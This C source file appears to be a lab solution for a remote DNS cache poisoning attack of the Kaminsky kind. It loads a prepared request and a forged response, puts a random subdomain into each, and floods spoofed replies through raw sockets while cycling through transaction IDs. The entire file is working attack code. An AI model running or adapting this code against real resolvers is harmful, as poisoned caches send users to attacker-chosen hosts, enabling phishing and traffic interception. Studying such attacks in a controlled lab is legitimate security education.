#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 100000


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(unsigned char *ip_req, int n_req);
void send_dns_response(unsigned char *ip_resp, int n_resp);

int main()
{
  long i = 0;
  int k = 0;
  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[27]="abcdefghijklmnopqrstuvwxyz";
  while (1) {
    unsigned short transaction_id = 0;
	unsigned short id_net_order;
    // Generate a random name with length 5
    char name[6];
    for (k=0; k<5; k++)  name[k] = a[rand() % 26];
	//printf("%s\n",name);
	memcpy(ip_req+41, name, 5);
	memcpy(ip_resp+41, name, 5);
	memcpy(ip_resp+64, name, 5);
	send_dns_request(ip_req, n_req);
	
	for(transaction_id = 1; transaction_id < 64000; transaction_id++) {
		    printf("attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\n", ++i, name, transaction_id);
			id_net_order = htons(transaction_id);
			memcpy(ip_resp+28, &id_net_order, 2);
			send_dns_response(ip_resp, n_resp);
	}
  }
}



void send_dns_request(unsigned char *ip_req, int n_req)
{
	send_raw_packet(ip_req, n_req);
}

void send_dns_response(unsigned char *ip_resp, int n_resp)
{
  send_raw_packet(ip_resp, n_resp);
}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
